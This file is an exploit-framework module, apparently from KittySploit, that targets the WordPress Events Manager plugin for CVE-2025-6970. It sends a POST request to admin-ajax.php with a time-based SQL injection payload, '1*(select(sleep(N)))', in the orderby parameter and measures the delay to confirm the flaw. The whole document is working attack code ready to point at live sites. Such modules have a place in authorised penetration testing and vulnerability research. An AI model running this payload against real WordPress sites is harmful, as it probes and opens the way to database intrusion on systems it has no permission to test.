#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Events Manager CVE-2025-6970 — orderby sleep probe."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Events Manager CVE-2025-6970 SQLi probe",
        "description": "POST search_events with injectable orderby (time-based).",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-6970"],
        "tags": ["wordpress", "events-manager", "sqli", "auxiliary", "cve-2025-6970"],
    }

    path = OptString("/", "WordPress base path", required=False)
    sleep_seconds = OptInteger(8, "Sleep seconds", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        s = int(self.sleep_seconds or 8)
        orderby = f"1*(select(sleep({s})))"
        start = time.monotonic()
        self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            data=f"action=search_events&orderby={orderby}",
            timeout=s + 20,
        )
        print_status(f"Elapsed {time.monotonic() - start:.2f}s")
        return True
